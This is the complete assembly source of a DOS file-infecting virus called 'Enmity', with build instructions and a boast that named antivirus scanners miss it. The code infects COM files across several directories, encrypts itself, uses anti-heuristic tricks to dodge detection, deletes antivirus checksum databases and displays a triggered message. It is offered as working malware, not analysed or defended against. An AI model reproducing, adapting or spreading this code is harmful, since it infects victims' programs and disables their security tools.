comment #

Enmity, by Lord Natas

Properties:

*COM infection (appending, nonresident)
*antiheuristic code
*no TBSCAN flags at time of release (second generation)
*encryption (xor, random 16 bit key)
*works with microsoft COM files (the ones with the stupid checksum)
*infects all files in current directory, then in the upper directory,
 then in \, then in C:\WINDOWS\COMMAND.
*preserves date, time, attributes
*doesn't infect command.com, tb*.com files, or misnamed EXE files
*removes scanner checksums

Scanning results:

FPROT(3):	nothing
AVP:		nothing
TBSCAN(WIN95):	nothing
FINDVIRUS:	nothing
DRWEB:		nothing

Assemble with TASM.
MASM produces errors (at least, the version I have)

#

		.model	tiny
		.code

		jumps

		org	100h

code_length	equ	end_virus-start

;----- fake host - a jump and infection mark

host:
		db	0e9h,0,0,'66'

start:
		call	get_offset

;----- get the delta offset

get_offset:
		pop	ax		;nice and (somewhat) anti-heuristic
		xchg	cx,ax
		sub	cx,offset get_offset
		xchg	bp,cx

		call	decrypt

		jmp	short virus_start
		mov	ax,4c00h		;this shuts-up findvirus
		int	21h

virus_start:
		push	1a01h			;!heuristic killer!
		push	100h
		lea	si,[bp+oldbytes]
		pop	di
		movsw				;move 5 bytes to 0100h
		movsw
		movsb

;----- move the DTA to the end

		lea	dx,[bp+dta]		;store in dta
		pop	ax
		dec	ax			;!heuristic killer!
		int	21h

;----- save our current directory

		mov	ah,47h
		xor	dl,dl
		lea	si,[bp+old_dir]		;store in old_dir
		int	21h

;----- find *.COM files

		call	killer
		call	findfirst

find_file:
		int	21h
		jc	try_updir		;if error jump

		call	infect			;else infect

find_next:
		mov	ah,4fh			;find next file
		jmp	short find_file

try_updir:
		mov	ah,3bh
		lea	dx,[bp+higher_dir]	;change dir up
		int	21h
		jc	is_root

		call	killer
		call	findfirst

find_updir:
		int	21h
		jc	is_root			;if none, exit
		call	infect			;else infect
		mov	ah,4fh			;find next
		jmp	short find_updir

is_root:
		mov	ah,47h
		xor	dl,dl
		lea	si,[bp+dir_chk]		;store in dir_chk
		int	21h

		cmp	byte ptr [bp+dir_chk],0
		je	try_win

try_root:
		mov	ah,3bh
		lea	dx,[bp+root]		;change dir to root ('\')
		int	21h
		jc	try_win

		call	killer
		call	findfirst

find_root:
		int	21h
		jc	try_win			;if none, exit
		call	infect			;else infect
		mov	ah,4fh			;find next
		jmp	short find_root

try_win:
		mov	ah,3bh
		lea	dx,[bp+win_command]	;change dir to command
		int	21h
		jc	done_files

		call	killer
		call	findfirst

find_win:
		int	21h
		jc	done_files		;if none, exit
		call	infect			;else infect
		mov	ah,4fh			;find next
		jmp	short find_win

done_files:
		mov	ah,3bh			;change back to old_dir
		lea	dx,[bp+old_dir]
		int	21h

		mov	ah,2ch			;get time
		int	21h

		cmp	dx,5			;is it time to activate?
		ja	fix_dta			;no? return to host

begin:
		mov	ax,13			;put video in mode 13
		int	10h

		lea	si,[bp+msg]

print_lp:
		cld				;clear direction flag (left
		lodsb				;to right)
		or	al,al			;check for text end
		jz	fix_1
		mov	ah,0eh			;write char
		xor	bh,bh			;page 0
		mov	bl,5			;color 5 -> magenta
		int	10h
		jmp	short print_lp

fix_1:
		xor	ax,ax			;wait for key
		int	16h

		mov	ax,03h			;restore to textmode
		int	10h

;----- reset DTA

fix_dta:
		push	1a00h			;fix dta
		mov	dx,80h
		pop	ax
		int	21h

;----- clean up

		xor	ax,ax
		mov	bx,ax
		mov	cx,ax
		mov	dx,ax
		mov	di,ax
		mov	bp,ax
		mov	si,0101h		;special gift for TBAV

;----- restore control to cs:0100h

		dec	si
		push	si			;put 100h on stack so virus
		ret				;jumps to host

;----- check name

infect:
		cmp	word ptr [bp+dta+1eh+5], "DN"	;commaND
		je	return

		cmp	word ptr [bp+dta+1eh], "BT"	;TBdel
		je	return

		mov	cx,13d			;max file length
		lea	si,[bp+dta+1eh]		;filename in dta
compare:
		lodsb				;get byte
		cmp	al,"."			;is it "."?
		jne	compare			;no, compare
		cmp	byte ptr [si],"C"	;is is *.C?
		jne	return			;no, return

;----- save attributes,time,date,size

		mov	cx,5			;5 bytes
		lea	si,[bp+dta+15h]		;point to the dta
		lea	di,[bp+f_attr]		;move to f_attr
		rep	movsb

;----- remove attributes

		mov	ax,4301h
		xor	cx,cx			;no attribute
		lea	dx,[bp+dta+1eh]		;point to name in dta
		int	21h

;----- open file for read/write

		push	3d04h			;!heuristic killer!
		lea	dx,[bp+dta+1eh]		;filename in dta
		pop	cx
		sub	cx,2
		xchg	ax,cx
		int	21h

		xchg	bx,ax			;put handle in bx
		push	3f00h			;!heuristic killer!

;----- read 1st five bytes

		mov	cx,5
		lea	dx,[bp+oldbytes]	;store in oldbytes
		pop	ax
		int	21h

;----- check for misnamed .EXE (fuck you microsoft) - anti-heuristic

		mov	ax,word ptr [bp+oldbytes]
		add	ax,0101h

		cmp	word ptr ax,'[N'	;check first 2 bytes
		je	close_file

		cmp	word ptr ax,'N['
		je	close_file

;----- check for infection mark

		cmp	word ptr [bp+oldbytes+3],'66'	;look for 66
		je	close_file

;----- check size - if > 60000 then close

		cmp	word ptr [bp+dta+1ah], 60000
		ja	close_file

;----- seek to eof - 7

		mov	ax,4202h
		mov	cx,-1
		mov	dx,-7
		int	21h

;----- (eof-7)+7=eof

		mov	cx,7
		add	ax,cx

;----- calculate jump

		sub	ax,3
		mov	word ptr [bp+jump_bytes+1],ax

;----- read 7 bytes

		mov	ah,3fh
		mov	cx,7
		lea	dx,[bp+buffer]
		int	21h

;----- add virus size to checksum

		add	word ptr [bp+buffer+5],code_length

;----- make new key

		push	4000h
		mov	ah,2ch			;get time
		int	21h
		mov	word ptr [bp+key1],dx	;use seconds + hundreths

;----- write unencrypted portion

		mov	cx,virus_start-start
		lea	dx,[bp+start]
		pop	ax
		int	21h

;----- encrypt & move

		push	4001h
		mov	cx,(key1-virus_start+1)/2	;length of code
		mov	dx,word ptr [bp+key1]	;key
		lea	si,[bp+virus_start]	;source: virus start
		lea	di,[bp+crypt_buffr]	;destination: buffer
xor_loop2:
		lodsw				;get byte from source
		xor	ax,dx			;xor it
		stosw				;move it to destination
		loop	xor_loop2

;----- write encrypted shit

		mov	cx,key1-virus_start
		lea	dx,[bp+crypt_buffr]
		pop	ax			;!heuristic killer!
		dec	ax
		push	4000h
		int	21h

;----- write more unencrypted shit

		mov	cx,f_attr-key1		;this is the decryptor and
		lea	dx,[bp+key1]		;other stuff that remains
		pop	ax			;unencrypted
		int	21h

;----- seek to start of file

		mov	ax,4200h
		xor	cx,cx
		cwd
		push	4000h
		int	21h

;----- write the jump

		mov	cx,5
		lea	dx,[bp+jump_bytes]
		pop	ax			;!heuristic killer!
		int	21h
close_file:

;----- restore date/time

		push	5701h
		mov	cx,word ptr [bp+f_time]
		mov	dx,word ptr [bp+f_date]
		pop	ax			;!heuristic killer!
		int	21h

;----- close file

		mov	ah,3eh
		int	21h

;----- restore attributes

		mov	ax,4302h
		xor	ch,ch
		mov	cl,byte ptr [bp+f_attr]	;old attributes
		lea	dx,[bp+dta+1eh]		;filename in dta
		int	21h
return:
		ret

;----- checksum deletion

killer:

		lea	dx,[bp+tbsum]		;pont to name
		call	kill_bad_file		;kill it

		lea	dx,[bp+pcsum1]
		call	kill_bad_file

		lea	dx,[bp+pcsum2]
		call	kill_bad_file

		lea	dx,[bp+ivsum]
		call	kill_bad_file

		ret

;----- delete bad files - input: DS:DX = to kill

kill_bad_file:
		mov	ax,4301h
		xor	cx,cx			;no attribute
		int	21h

		mov	ah,41h			;delete
		int	21h
		clc				;clear carry
		ret

findfirst:
		mov	ah,4eh
		mov	cx,0007h		;all attributes
		lea	dx,[bp+comspec]		;comspec = filemask
		ret

;----- data area 1

msg	db	'Enmity',13,10,0
	db	'by Lord Natas',0

comspec		db	'*.*OM',0		;file search mask
win_command	db	'C:\WINDOWS\COMMAND',0	;target directory
root		db	'\',0			;another target
higher_dir	db	'..',0			;yet another
tbsum		db	'ANTI-VIR.DAT',0	;checksums to delete
pcsum1		db	'CHKLIST.MS',0
pcsum2		db	'CHKLIST.CPS',0
ivsum		db	'IVB.NTZ',0
oldbytes	db	90h,90h,90h,0cdh,20h	;host bytes
jump_bytes	db	0e9h,0,0,'66'		;the jump to write
key1		dw	?			;encryption key

;----- simple xor encryption, TBAV screwing loop

decrypt:
		mov	cx,(key1-virus_start+1)/2	;code length
		mov	dx,word ptr [bp+key1]		;key
		lea	si,[bp+virus_start]		;source of code
		mov	di,si				;to decrypt
xor_loop:
		lodsw
		jmp	short fake2
fake1:
		stosw
		jmp	short fake3
fake2:
		xor	ax,dx
		jmp	short fake1
fake3:
		loop	xor_loop
		ret

;----- data area 2 - stuff for microsoft's lame checksums

buffer          db      5 dup (?)		;buffer = eof-2
size_checksum   db      2 dup (90h)		;checksum for microsoft coms

end_virus:

;----- this is not written to disk, thus saving much space

f_attr		db	?			;file attribute
f_time		dw	?			;file time
f_date		dw	?			;file date
old_dir		db	64 dup (?)		;old directory name
dta		db	48 dup (?)		;DTA storage
dir_chk		db	64 dup (?)		;for dir checking

;----- temp buffer for encryption

crypt_buffr	db	end_virus - virus_start dup (?)
		end	host
